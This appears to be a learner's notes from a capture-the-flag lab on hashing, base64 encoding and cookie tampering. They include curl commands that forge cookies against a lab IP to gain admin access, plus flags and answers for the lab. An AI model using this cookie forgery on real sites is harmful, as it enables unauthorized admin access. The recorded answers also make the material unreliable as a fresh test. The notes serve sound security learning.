	c4ca4238a0b923820dcc509a6f75849b
1
	sha-256
	6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
1
	sha-512	4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a
1
	sha1
	356a192b7913b04c54574d18c28d46e6395428ab

You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as https://crackstation.net/ keep databases of billions of hashes and their original strings.

Encoding
Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.


Take the below data as an example which is set by the web server upon logging in:

Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.

```
┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$ curl http://10.10.235.218/cookie-test
Not Logged In                                                                                           
┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.235.218/cookie-test
Logged In As A User                                                                                           
┌──(kali㉿kali)-[/usr/share/seclists/Usernames/Names]
└─$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.235.218/cookie-test
Logged In As An Admin - THM{COOKIE_TAMPERING}  
```
What is the flag from changing the plain text cookie values?
*THM{COOKIE_TAMPERING}*

What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?
*463729* (crackstation)

What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?
*THM{BASE64_ENCODING}* (cyberchef)


Encode the following value using base64 {"id":1,"admin":true}
*eyJpZCI6MSwiYWRtaW4iOnRydWV9*

[[Subdomain Enumeration]]